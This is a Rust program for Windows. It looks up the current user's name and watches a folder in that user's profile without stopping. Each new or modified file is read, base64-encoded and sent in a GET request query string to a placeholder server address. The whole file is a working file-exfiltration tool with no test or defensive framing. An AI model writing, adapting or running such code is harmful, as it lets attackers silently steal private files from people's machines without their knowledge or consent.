use std::fs::{self, File};
use std::io::{self, Read};
use std::path::{Path, PathBuf};
use std::time::SystemTime;
use base64::encode;
use reqwest::{self, Client};
use std::{thread, time};
use std::os::windows::ffi::OsStringExt;
use std::ffi::OsString;
use winapi::um::winbase::GetUserNameW;
use tokio::runtime::Runtime;

async fn get_file_content_and_base64_encode(filepath: &Path) -> io::Result<String> {
    let mut file = File::open(filepath)?;
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer)?;
    Ok(encode(buffer))
}

async fn monitor_file_path(file_path: &Path, url: &str) -> io::Result<()> {
    println!("Monitoring path: {:?}", file_path);

    let mut file_times: std::collections::HashMap<PathBuf, SystemTime> = std::collections::HashMap::new();

    loop {
        for entry in fs::read_dir(file_path)? {
            let file_path_full = entry?.path();
            if file_path_full.is_file() {
                let file_time = fs::metadata(&file_path_full)?.modified()?;
                if !file_times.contains_key(&file_path_full) || file_times[&file_path_full] != file_time {
                    file_times.insert(file_path_full.clone(), file_time);
                    let content = fs::read_to_string(&file_path_full)?;
                    let encoded_content = get_file_content_and_base64_encode(&file_path_full).await?;
                    let client = Client::new();
                    let response = client.get(&format!("{}?content={}", url, encoded_content)).send().await;
                    match response {
                        Ok(res) => {
                            let _ = res.text().await.map_err(|e| io::Error::new(io::ErrorKind::Other, e))?;
                            println!("Sent file content to {}: {}", url, content);
                        }
                        Err(e) => println!("Error: {}", e),
                    }
                }
            }
        }
        thread::sleep(time::Duration::from_secs(1));
    }

    Ok(())
}
fn main() -> io::Result<()> {
    let username = get_current_username()?;
    println!("Current username: {}", username);
    let path_str = format!(r"C:\Users\{}\thispath", username);
    let file_path = Path::new(&path_str);
    let url = "http://<server>";

    let mut rt = Runtime::new().unwrap();
    rt.block_on(monitor_file_path(&file_path, url))
}

fn get_current_username() -> io::Result<String> {
    unsafe {
        let mut buf = vec![0u16; 256];
        let mut len = buf.len() as u32;
        let result = GetUserNameW(buf.as_mut_ptr(), &mut len);
        if result == 0 {
            return Err(io::Error::last_os_error());
        }
        buf.truncate((len - 1) as usize); // remove null terminator
        let os_string = OsString::from_wide(&buf);
        Ok(os_string.to_string_lossy().into_owned())
    }
}
